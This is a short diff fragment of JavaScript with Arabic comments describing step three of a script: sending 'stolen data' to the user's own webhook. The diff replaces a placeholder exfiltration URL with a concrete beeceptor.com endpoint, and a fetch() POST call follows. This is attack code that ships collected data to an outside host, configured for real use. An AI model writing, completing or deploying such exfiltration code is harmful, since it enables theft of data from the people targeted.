@@ -18,7 +18,7 @@
 
         // 3. إرسال البيانات المسروقة إلى الـ Webhook الخاص بك
         // استبدل الرابط أدناه برابط الـ Webhook الذي تريد استقبال البيانات عليه
-        const myWebhook = 'https://your-exfil-webhook.beeceptor.com'; 
+        const myWebhook = 'https://tttestttwwwwwssswww.free.beeceptor.com/ssssssssss'; 
         
         await fetch(myWebhook, {
             method: 'POST',
